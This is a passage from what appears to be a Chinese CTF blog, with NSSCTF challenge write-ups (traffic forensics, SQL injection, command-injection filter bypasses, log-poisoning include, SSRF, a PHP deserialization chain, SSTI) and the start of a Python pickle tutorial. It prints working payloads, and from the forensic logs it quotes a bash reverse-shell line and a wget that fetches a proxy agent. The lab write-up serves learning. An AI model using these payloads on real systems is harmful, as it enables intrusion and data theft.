],    &quot;support&quot;: &#123;        &quot;issues&quot;: &quot;https://github.com/smarty-php/smarty/issues&quot;,        &quot;forum&quot;: &quot;https://github.com/smarty-php/smarty/discussions&quot;    &#125;,    &quot;require&quot;: &#123;        &quot;php&quot;: &quot;^7.1 || ^8.0&quot;    &#125;,    &quot;autoload&quot;: &#123;        &quot;classmap&quot;: [            &quot;libs/&quot;        ]    &#125;,    &quot;extra&quot;: &#123;        &quot;branch-alias&quot;: &#123;            &quot;dev-master&quot;: &quot;4.0.x-dev&quot;        &#125;    &#125;,    &quot;require-dev&quot;: &#123;        &quot;phpunit/phpunit&quot;: &quot;^8.5 || ^7.5&quot;,        &quot;smarty/smarty-lexer&quot;: &quot;^3.1&quot;    &#125;&#125;\n\n发现是smarty模板,应该是存在模板注入的\n结合题目名称于是在出题人的博客中查到相关知识点\n\ndata=&#123;if system(&#x27;ls /&#x27;)&#125;&#123;/if&#125;\n\n\n\nNSSCTF&#123;d1fca53a-f421-45dd-936f-ef7c8bacfae3&#125;\n\n[陇剑杯 2021]webshell（问2）单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客修改了一个日志文件，文件的绝对路径为_____________。\n\n\n搜.log即可\nNSSCTF&#123;/var/www/html/data/Runtime/Logs/Home/21_08_07.log&#125;\n\n[陇剑杯 2021]jwt（问6）昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：黑客在服务器上修改了一个配置文件，文件的绝对路径为_____________。\n\n黑客攻击的请求方式一般是POST，且配置文件一般存放在&#x2F;etc下\nhttp.request.method==“POST”&amp;&amp;http contains “etc”\n\n\nNSSCTF&#123;/etc/pam.d/common-auth&#125;\n\n[陇剑杯 2021]SQL注入（问1）某应用程序被攻击，请分析日志后作答：黑客在注入过程中采用的注入手法叫_____________。（格式为4个汉字，例如“拼搏努力”）\n\n\n看到if 布尔盲注\nNSSCTF&#123;布尔盲注&#125;\n\n[陇剑杯 2021]webshell（问4）单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客写入的webshell文件名是_____________。\n\n\nNSSCTF&#123;1.php&#125;\n\n[陇剑杯 2021]webshell（问3）单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客获取webshell之后，权限是______？\n\n\n执行了whoami,追踪一下流,没想到是404响应,直接正则搜whoami,看返回包是不是200\n\n终于找到了,再追踪一下流\n\nNSSCTF&#123;www-data&#125;\n\n[陇剑杯 2021]日志分析（问2）单位某应用程序被攻击，请分析日志，进行作答：分析攻击流量，黑客往/tmp目录写入一个文件，文件名为_____________。\n\n直接搜索tmp得到一串url编码过的字符串,解码\nd172.17.0.1 - - [07/Aug/2021:01:38:21  0000] &quot;GET /?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;./files/filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;./files/call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125; HTTP/1.1&quot; 302 879 &quot;-&quot; &quot;python-requests/2.26.0&quot;\n\n文件名为sess_car\nNSSCTF&#123;sess_car&#125;\n\n[陇剑杯 2021]webshell（问5）单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客上传的代理工具客户端名字是_____________。\n\n65题知道_POST的参数即连接密码是aaa,搜aaa\n\nNSSCTF&#123;frpc&#125;\n\n[陇剑杯 2021]webshell（问6单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客代理工具的回连服务端IP是_____________\n\n肯定还是找1.php\n\n在这个流里找到了\n\n\nNSSCTF&#123;192.168.239.123&#125;\n\n[陇剑杯 2021]webshell（问7）单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：黑客的socks5的连接账号、密码是______。（中间使用#号隔开，例如admin#passwd）\n\nNSSCTF&#123;0HDFt16cLQJ#JTN276Gp&#125;\n\n[陇剑杯 2021]日志分析（问3）分析攻击流量，黑客使用的是______类读取了秘密文件。\n\nd172.17.0.1 - - [07/Aug/2021:01:38:21  0000] &quot;GET /?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;./files/filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;./files/call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125; HTTP/1.1&quot; 302 879 &quot;-&quot; &quot;python-requests/2.26.0&quot;\n\nNSSCTF&#123;SplFileObject&#125;\n\n[陇剑杯 2021]简单日志分析（问2）黑客查看的秘密文件的绝对路径是_____________。得\n\n\n0S&#x27;cat /Th4s_IS_VERY_Import_Fi1e&#x27;NSSCTF&#123;/Th4s_IS_VERY_Import_Fi1e&#125;\n\n[陇剑杯 2021]简单日志分析（问1）黑客攻击的参数是______。（如有字母请全部使用小写）\n\n见上题,参数即为user\nNSSCTF&#123;user&#125;\n\n[陇剑杯 2021]简单日志分析（问3）黑客反弹shell的ip和端口是_____________。（格式使用“ip:端口&quot;，例如127.0.0.1:2333）。\n\n看到还有一处base64字符串,解码得到\nbash -i +&amp; /dev/tcp/192.168.2.197/8888 0&gt;&amp;1NSSCTF&#123;192.168.2.197:8888&#125;\n\n[陇剑杯 2021]SQL注入（问2-3）最终获取flag的数据库名、表名和字段名是_____________。（格式为“数据库名#表名#字段名”，例如database#table#column）最终获取flag的字符串\n\n在日志里往后看,where语句后面有接着答案\n/index.php?id=1%20and%20if(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name=&#x27;flag&#x27;%20and%20table_schema=&#x27;sqli&#x27;),1,1)%20=%20&#x27;s&#x27;,1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1&quot; 200 448 &quot;-&quot; &quot;python-requests/2.26.0&quot;/index.php?id=1%20and%20if(substr((select%20flag%20from%20sqli.flag),43,1)%20=%20&#x27;w&#x27;,1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1&quot; 200 427 &quot;-&quot; &quot;python-requests/2.26.0&quot;\n\nNSSCTF&#123;sqli#flag#flag&#125;\n\n下一题,在linux中输入命令\ncat access.log | grep &#x27;select%20flag%20from%20&#x27; | grep -E &quot;478|479|480|481|482&quot; | cut -d &quot;&#x27;&quot; -f 2 &gt; 1.txt\n\nimport urllib.parsea = &#x27;&#x27;with open(&#x27;1.txt&#x27;) as f:    for i in f.readlines():        a += i.strip()print(urllib.parse.unquote(a))\n\n\nflag&#123;deddcd67-bcfd-487e-b940-1217e668c7db&#125;\n\n[陇剑杯 2021]内存分析1.虚拟机的密码是_____________。（密码中为flag&#123;xxxx&#125;，含有空格，提交时不要去掉）\n\n使用mimiktz分析即可\npython2 vol.py --plugins=plugins -f &quot;/home/winter/桌面/volatility/problems/ljb.vmem&quot; --profile=Win7SP1x64 mimikatz\n\n\nNSSCTF&#123;W31C0M3 T0 THiS 34SY F0R3NSiCX&#125;\n\n2.虚拟机中有一个某品牌手机的备份文件，文件里的图片里的字符串为_____________。（解题过程中需要用到上一题答案中flag&#123;&#125;内的内容进行处理。本题的格式也是flag&#123;xxx&#125;，含有空格，提交时不要去掉）\n\npython2 vol.py --plugins=plugins -f &quot;/home/winter/桌面/volatility/problems/ljb.vmem&quot; --profile=Win7SP1x64 filescan |grep &quot;HUAWEI&quot;\n\n\n得到偏移量0x000000007d8c7d10,dump下来\npython2 vol.py --plugins=plugins -f &quot;/home/winter/桌面/volatility/problems/ljb.vmem&quot; --profile=Win7SP1x64 dumpfiles -Q 0x000000007d8c7d10\n\n查资料还发现 ，由于华为手机助手加密的文件解密时需要依赖整个文件夹中的文件，只有一个images0.tar.enc是不行的。需要另一个exe文件,就是找到的这个文件\ngithub找到华为备份恢复工具https://github.com/RealityNet/kobackupdec\n下载该项目，然后使用命令进行恢复，这个工具需要密码进行恢复，那么密码就是刚刚的第一问的flag，而且提示是“没有空格，只有下划线”\npython3 kobackupdec.py -vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX &quot;/home/winter/backup_input/HUAWEI P40_2021-aa-bb xx.yy.zz&quot; 4 \n\n然后在文件夹即可找到图片\n\nNSSCTF&#123;TH4NK Y0U FOR DECRYPTING MY DATA&#125;\n\n3.[SWPUCTF 2022 ]ez_sql测试绕过了or union and 和空格但只是简单把这些字符串置空,双写绕过\nnss=-1&#x27;/**/ununionion/**/select/**/1,2,group_concat(database())/**/limit/**/1,1#NSS_dbnss=-1&#x27;/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=&#x27;NSS_db&#x27;limit/**/1,1#NSS_tb,usersnss=-1&#x27;/**/ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=&#x27;NSS_tb&#x27;limit/**/1,1#\n\n\nnss=-1&#x27;/**/ununionion/**/select/**/1,2,group_concat(id,Secr3t,flll444g)/**/from/**/NSS_db.NSS_tb/**/limit/**/1,1#\n\n\nNSSCTF&#123;dafe017f-0830-4583-ad8e-9a0066f166e4&#125;\n\n[MoeCTF 2021]babyRCE&lt;?php$rce = $_GET[&#x27;rce&#x27;];if (isset($rce)) &#123;    if (!preg_match(&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\\;|[0-9]|\\*|\\`|\\%|\\&gt;|\\&lt;|\\&#x27;|\\&quot;/i&quot;, $rce)) &#123;        system($rce);    &#125;else &#123;        echo &quot;hhhhhhacker!!!&quot;.&quot;\\n&quot;;    &#125;&#125;\n\nGET?rce=c\\at%09f\\lag.php\n\n\nNSSCTF&#123;e312aec7-628d-4856-8b22-70d549b5fae8&#125;\n\n[WUSTCTF 2020]朴实无华dirsearch发现robots.txt,访问&#x2F;fAke_f1agggg.php\n\n访问fl4g.php\n&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;    &#125;else&#123;        die(&quot;金钱解决不了穷人的本质问题&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123;   $md5=$_GET[&#x27;md5&#x27;];   if ($md5==md5($md5))       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;   else       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123;    $get_flag = $_GET[&#x27;get_flag&#x27;];    if(!strstr($get_flag,&quot; &quot;))&#123;        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;        system($get_flag);    &#125;else&#123;        die(&quot;快到非洲了&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;?&gt;\n\n/fl4g.php?num=2019e9&amp;&amp;md5=0e215962017&amp;&amp;get_flag=tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\n\n\nNSSCTF&#123;7347029a-b29f-42a0-bdeb-3da09ef31a8c&#125;\n\n[陇剑杯 2021]ios1,2,3一位ios的安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答：黑客所控制的C&amp;C服务器IP是_____________。\n\n导出http对象,查看导出的文件\n\n在wireshark上查找该字符串”ios_agent”\n\nwget https://github.com/ph4ntonn/Stowaway/releases/download/1.6.2/ios_agent\n\n从这个github下载了个文件给予权限后，执行了一些命令,去网站看\n参数:-l 被动模式下的监听地址[ip]:&lt;port&gt;-s 节点通信加密密钥,所有节点(admin&amp;&amp;agent)必须一致-c 主动模式下的目标节点地址--socks5-proxy socks5代理服务器地址--socks5-proxyu socks5代理服务器用户名(可选)--socks5-proxyp socks5代理服务器密码(可选)--http-proxy http代理服务器地址--down 下游协议类型,默认为裸TCP流量,可选HTTP/WS--tls-enable 为节点通信启用TLS，在启用TLS后，AES加密将被禁用--domain 指定TLS SNI/WebSocket域名，若为空，默认为目标节点地址--heartbeat 开启心跳包\n\n\n前三题答案已出\nNSSCTF&#123;3.128.156.159&#125;NSSCTF&#123;stowaway&#125;NSSCTF&#123;hack4sec&#125;\n\n4.一位ios的安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答：黑客通过SQL盲注拿到了一个敏感数据，内容是____________\n\n流量包内存在tls流量,使用附件里的keylog.txt解密https流量\n编辑——首选项——protocols——TLS——导入keylog.txt\n导入后就可以在这里搜索http2，看到解密后的数据了\n\n题目上说黑客通过SQL盲注拿到了一个敏感数据。我们在分组列表中搜索select，可以看到是盲注\n\n一个个把十六进制的值提取出来\n746558f3-c841-456b-85d7-d6c0f2edabb2NSSCTF&#123;746558f3-c841-456b-85d7-d6c0f2edabb2&#125;\n\n6.黑客端口扫描的扫描器的扫描范围是**__**。\n端口扫描会涉及到TCP的RST\n\nRST表示复位，用来异常的关闭连接，在TCP的设计中它是不可或缺的。就像上面说的一样，发送RST包关闭连接时，不必等缓冲区的包都发出去（不像上面的FIN包），直接就丢弃缓存区的包发送RST包。而接收端收到RST包后，也不必发送ACK包来确认。 TCP处理程序会在自己认为的异常时刻发送RST包。例如，A向B发起连接，但B之上并未监听相应的端口，这时B操作系统上的TCP处理程序会发RST包。\n\n既然是端口扫描，必然会涉及到rst报文和连续端口访问，我们打开专家信息找到rst\n\n\n从10-499都有RST包\nNSSCTF&#123;10-499&#125;\n\n[HNCTF 2022 WEEK2]easy_include&lt;?php//WEB手要懂得搜索if(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    if(preg_match(&quot;/php|flag|data|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=/i&quot;, $file))&#123;        die(&quot;error&quot;);    &#125;    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;\n\nfile没ban,*也过滤了,尝试日志写马\n?file=file:///var/log/nginx/access.logua头:&lt;?php system(&#x27;cat /f*&#x27;)?&gt;\n\n\nNSSCTF&#123;369b1fe1-de00-44fb-b9df-1d66cda1c443&#125;\n\n[HNCTF 2022 WEEK2]ez_ssrf\n进来一个apache默认界面发现是2.4.38,上网搜一下漏洞\nhttps://www.cnblogs.com/jdslf/p/16846682.html\ndirsearch扫描到index.php\n&lt;?phphighlight_file(__FILE__);error_reporting(0);$data=base64_decode($_GET[&#x27;data&#x27;]);$host=$_GET[&#x27;host&#x27;];$port=$_GET[&#x27;port&#x27;];$fp=fsockopen($host,intval($port),$error,$errstr,30);//建立一个 socket 连接,接收$host主机参数，$port端口参数（先会被转为整数），$error为错误号，设为非0；$errstr (错误信息): 如果连接失败，这个参数会包含一个字符串描述的错误信息。30秒超时if(!$fp) &#123;/// 如果$fp有错误，也就是返回的是非0，取反为0，执行退出    die();&#125;else &#123;    fwrite($fp,$data);// fwrite函数接收$fp编码后的数据    while(!feof($data))//feof判断是否达到数据末尾    &#123;        echo fgets($fp,128);// 输出 fgets，fgets接收来自$fp的数据，并且读取最大128个字节数    &#125;    fclose($fp);&#125;\n\n那我们可以ssrf,伪造一个http请求头,让socket和127.0.0.1连接,把构造的数据写入到连接的 socket 中,再从连接中读取返回的响应数据\n&lt;?php$out = &quot;GET /flag.php HTTP/1.1\\r\\n&quot;;$out .= &quot;Host: 127.0.0.1\\r\\n&quot;;$out .= &quot;Connection: Keep-Alive\\r\\n\\r\\n&quot;;echo $out;echo base64_encode($out)?&gt;R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBLZWVwLUFsaXZlDQoNCg==?host=127.0.0.1&amp;port=80&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBLZWVwLUFsaXZlDQoNCg==\n\n\nnssctf&#123;095948b9b2be-8444-3750-99ba94d3b4f5&#125;\n\n[第五空间 2021]pklovecloud&lt;?php  include &#x27;flag.php&#x27;;class pkshow &#123;      function echo_name()         &#123;                  return &quot;Pk very safe^.^&quot;;          &#125;  &#125; class acp &#123;       protected $cinder;      public $neutron;    public $nova;    function __construct()     &#123;              $this-&gt;cinder = new pkshow;    &#125;      function __toString()          &#123;                  if (isset($this-&gt;cinder))              return $this-&gt;cinder-&gt;echo_name();          &#125;  &#125;  class ace&#123;        public $filename;         public $openstack;    public $docker;     function echo_name()          &#123;           $this-&gt;openstack = unserialize($this-&gt;docker);        $this-&gt;openstack-&gt;neutron = $heat;        if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)        &#123;        $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;            if (file_get_contents($file))                     &#123;                              return file_get_contents($file);             &#125;              else             &#123;                 return &quot;keystone lost~&quot;;             &#125;            &#125;    &#125;  &#125;  if (isset($_GET[&#x27;pks&#x27;]))  &#123;    $logData = unserialize($_GET[&#x27;pks&#x27;]);    echo $logData; &#125; else &#123;     highlight_file(__file__); &#125;?&gt;\n\n通过ace类里的echo_name方法include flag.php,发现acp里有__tostring方法,再看到ace类里有echo $logData这一句,我们把$logData设置为acp对象即可触发__tostring方法\nfunction __construct() &#123;          $this-&gt;cinder = new ace;&#125;\n\n然后看echo_name方法,不让他反序列化就自然绕过if了,那么就让$docker&#x3D;null即可,这样$openstac也为null\nexp:\n&lt;?phpclass pkshow&#123;    function echo_name()    &#123;        return &quot;Pk very safe^.^&quot;;    &#125;&#125;class acp&#123;    protected $cinder;    public $neutron;    public $nova;    function __construct()    &#123;        $this-&gt;cinder = new ace;    &#125;    function __toString()    &#123;    &#125;&#125;class ace&#123;    public $filename=&#x27;flag.php&#x27;;    public $openstack;    public $docker=null;&#125;$a= new acp();echo urlencode(serialize($a));?&gt;O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3BN%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D\n\n\nflag在&#x2F;nssctfasdasdflag,改一下filename即可,改一次不行,改成..&#x2F;才对\n\nNSSCTF&#123;f356c7e2-a4bc-47d2-8e8c-b1c8854afb71&#125;\n\n[HNCTF 2022 WEEK3]ssssti猜到参数是name,试继承链的时候顺便测试一下waf,fenjing一把梭\npython -m fenjing crack -u http://node5.anna.nssctf.cn:29433/ --method GET --inputs name\n\n\nNSSCTF&#123;e5b9ec3b-6c84-4b83-a887-bb1e78e1513c&#125;\n\n","categories":["nssctf"],"tags":["nssctf"]},{"title":"python反序列化","url":"/2025/09/10/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"基础的pickle反序列化介绍和php的反序列化一样,python也存在反序列化,都是为了解决对象传输与持久化储存问题\n相关库和方法在python中有两个库是用来序列化&#x2F;反序列化操作的,分别是pickle&#x2F;cPickle,(在python官方文档中,意思是封存&#x2F;解封),比较常见的是dumps(序列化)和loads(反序列化)\nimport pickleclass Test:    def __init__(self):        self.a = 1test = Test()serialized = pickle.dumps(test)print(serialized)unserialized = pickle.loads(serialized)print(unserialized.a)&quot;&quot;&quot;b&#x27;\\x80\\x04\\x95&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08__main__\\x94\\x8c\\x04Test\\x94\\x93\\x94)\\x81\\x94&#125;\\x94\\x8c\\x01a\\x94K\\x01sb.&#x27;1&quot;&quot;&quot;\n\n第一行看起来不太可读,下面是解释\nPVM要对序列化、反序列化很清楚的话，一定要了解 PVM\n首先，在调用 pickle 的时候，实际上是 class pickle.Pickler 和 class pickle.Unpickler 在起作用，而这两个类又是依靠 Pickle Virtual Machine(PVM)，在更深层对输入进行着某种操作，从而最后得到了那串复杂的结果。\nPVM 由三部分组成：\n\n指令处理器：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止（看上面的代码示例，序列化之后的结果最后是 .）。最终留在栈顶的值将被作为反序列化对象返回。需要注意的是：\nopcode是单字节的\n带参数的指令用换行符来确定边界\n\n\n栈区:用list实现的,被用来临时存储数据、参数以及对象\n内存去:用 dict 实现的，为 PVM 的整个生命周期提供存储\n\n最后，PVM 还有协议一说，这里的协议指定了应该采用什么样的序列化、反序列化算法\nPVM协议当前共有 6 种不同的协议可用，使用的协议版本越高，读取所生成 pickle 对象所需的 Python 版本就要越新\n\nv0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python\nv1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容\nv2 版协议是在 Python 2.3 中加入的，它为存储 new-style class 提供了更高效的机制（参考 PEP 307）。\nv3 版协议是在 Python 3.0 中加入的，它显式地支持 bytes 字节对象，不能使用 Python 2.x 解封。这是 Python 3.0-3.7 的默认协议。\nv4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化（参考 PEP 3154）。它是 Python 3.8 使用的默认协议。\nv5 版协议是在 Python 3.8 中加入的。它增加了对带外数据的支持，并可加速带内数据处理（参考 PEP 574）。\n\n上面的代码示例其实可以指定PVM协议的版本,想得到人类易读的版本的话,可以指定一下版本\nimport pickleclass Test:    def __init__(self):        self.a = 1test = Test()serialized = pickle.dumps(test,protocol=0)print(serialized)unserialized = pickle.loads(serialized)print(unserialized.a)\n\n结果如下:\nb&#x27;ccopy_reg\\n_reconstructor\\np0\\n(c__main__\\nTest\\np1\\nc__builtin__\\nobject\\np2\\nNtp3\\nRp4\\n(dp5\\nVa\\np6\\nI1\\nsb.&#x27;1\n\n关键代码\npickle.dumps(obj[, protocol])\n\n\n功能：将obj对象序列化为string形式，而不是存入文件中。 参数: obj：想要序列化的obj对象。 protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。\n\npickle.loads(string)\n\n\n功能：从string中读出序列化前的obj对象。 参数: string：文件名称。\n\n在序列化时，协议版本是自动检测出来的，所以诸如 loads 方法是不需要参数来指定协议的。\n由于不同版本在利用的时候没有很大区别，所以本文以最易读的 v0 协议为例\nopcodeopcode 是 PVM 的灵魂，控制整个流程的运行.\nMARK           = b&#x27;(&#x27;   # 向栈中压入一个 MARK 标记STOP           = b&#x27;.&#x27;   # 程序结束，栈顶的一个元素作为 pickle.loads() 的返回值POP            = b&#x27;0&#x27;   # 丢弃栈顶对象POP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobjectDUP            = b&#x27;2&#x27;   # duplicate top stack itemFLOAT          = b&#x27;F&#x27;   # 实例化一个 float 对象INT            = b&#x27;I&#x27;   # 实例化一个 int 或者 bool 对象BININT         = b&#x27;J&#x27;   # push four-byte signed intBININT1        = b&#x27;K&#x27;   # push 1-byte unsigned intLONG           = b&#x27;L&#x27;   # push long; decimal string argumentBININT2        = b&#x27;M&#x27;   # push 2-byte unsigned intNONE           = b&#x27;N&#x27;   # 栈中压入 NonePERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string argBINPERSID      = b&#x27;Q&#x27;   # push persistent object; id is taken from stackREDUCE         = b&#x27;R&#x27;   # 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈STRING         = b&#x27;S&#x27;   # 实例化一个字符串对象BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argumentSHORT_BINSTRING= b&#x27;U&#x27;   # push string; counted binary string argument &lt; 256 bytesUNICODE        = b&#x27;V&#x27;   # 实例化一个 UNICODE 字符串对象BINUNICODE     = b&#x27;X&#x27;   # push Unicode string; counted UTF-8 string argumentAPPEND         = b&#x27;a&#x27;   # 将栈的第一个元素 append 到第二个元素（必须为列表）中BUILD          = b&#x27;b&#x27;   # 使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 __setstate__ 或 __dict__.update()GLOBAL         = b&#x27;c&#x27;   # 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈DICT           = b&#x27;d&#x27;   # 寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对），弹出组合，弹出 MARK，压回结果EMPTY_DICT     = b&#x27;&#125;&#x27;   # 向栈中直接压入一个空字典APPENDS        = b&#x27;e&#x27;   # 寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必须为列表）中GET            = b&#x27;g&#x27;   # 将 memo[n] 的压入栈BINGET         = b&#x27;h&#x27;   # push item from memo on stack; index is 1-byte argINST           = b&#x27;i&#x27;   # 相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）LONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte argLIST           = b&#x27;l&#x27;   # 从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为列表EMPTY_LIST     = b&#x27;]&#x27;   # 向栈中直接压入一个空列表OBJ            = b&#x27;o&#x27;   # 从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 MARK，压回结果，PUT            = b&#x27;p&#x27;   # 将栈顶对象储存至 memo[n]BINPUT         = b&#x27;q&#x27;   # store stack top in memo; index is 1-byte argLONG_BINPUT    = b&#x27;r&#x27;   # store stack top in memo; index is 4-byte argSETITEM        = b&#x27;s&#x27;   # 将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中TUPLE          = b&#x27;t&#x27;   # 寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果EMPTY_TUPLE    = b&#x27;)&#x27;   # 向栈中直接压入一个空元组SETITEMS       = b&#x27;u&#x27;   # 寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中BINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encodingTRUE           = b&#x27;I01\\n&#x27;  # not an opcode; see INT docs in pickletools.pyFALSE          = b&#x27;I00\\n&#x27;  # not an opcode; see INT docs in pickletools.py\n\n当然，这些都是 v0 协议的 opcode，其他版本的协议会新增&#x2F;替换一些 opcode\n以上面的b&#39;ccopy_reg\\n_reconstructor\\np0\\n(c__main__\\nTest\\np1\\nc__builtin__\\nobject\\np2\\nNtp3\\nRp4\\n(dp5\\nVa\\np6\\nI1\\nsb.&#39;为例子,现在来解读一下这个反序列化结果\nc copy_reg _reconstructor: stack[copy_reg._reconstructor]p 0: memo[copy_reg._reconstructor](: stack[(, copy_reg._reconstructor]c __main__ Test: stack[__main__.Test, (, copy_reg._reconstructor]p 1: memo[copy_reg._reconstructor, __main__.Test]c __builtin__ object: stack[__builtin__.object, __main__.Test, (, copy_reg._reconstructor]p 2: memo[copy_reg._reconstructor, __main__.Test, __builtin__.object]N: stack[None, __builtin__.object, __main__.Test, (, copy_reg._reconstructor]t: stack[(None, __builtin__.object, __main__.Test), copy_reg._reconstructor]p 3: memo[copy_reg._reconstructor, __main__.Test, __builtin__.object, (None, __builtin__.object, __main__.Test)]R stack[&lt;__main__.Test at 0x160578603d0&gt;]p 4: memo[copy_reg._reconstructor, __main__.Test, __builtin__.object, (None, __builtin__.object, __main__.Test), &lt;__main__.Test at 0x160578603d0&gt;](: stack[(, &lt;__main__.Test at 0x160578603d0&gt;]d: stack[&#123;&#125;, &lt;__main__.Test at 0x160578603d0&gt;]p 5: memo[copy_reg._reconstructor, __main__.Test, __builtin__.object, (None, __builtin__.object, __main__.Test), &lt;__main__.Test at 0x160578603d0&gt;, &#123;&#125;]V a: stack[&quot;a&quot;, &lt;__main__.Test at 0x160578603d0&gt;]p 6: memo[copy_reg._reconstructor, __main__.Test, __builtin__.object, (None, __builtin__.object, __main__.Test), &lt;__main__.Test at 0x160578603d0&gt;, &#123;&#125;, &quot;a&quot;]I 1: stack[1, &quot;a&quot;, &lt;__main__.Test at 0x160578603d0&gt;]s: stack[&#123;&quot;a&quot;: 1&#125;, &lt;__main__.Test at 0x160578603d0&gt;]b: stack[&lt;__main__.Test at 0x160578603d0&gt;]  # set a = 1.: []  # 返回 &lt;__main__.Test at 0x160578603d0&gt;\n\n感觉还是很难理解\n所以 Python 官方提供了工具，叫 pickletools，它的作用主要是：\n\n可读性较强的方式展示一个序列化对象（pickletools.dis）\n对一个序列化结果进行优化（pickletools.optimize）\n\nimport pickletoolsprint(pickletools.dis(serialized))\n\n结果如下:\n    0: c    GLOBAL     &#x27;copy_reg _reconstructor&#x27;   25: p    PUT        0   28: (    MARK   29: c        GLOBAL   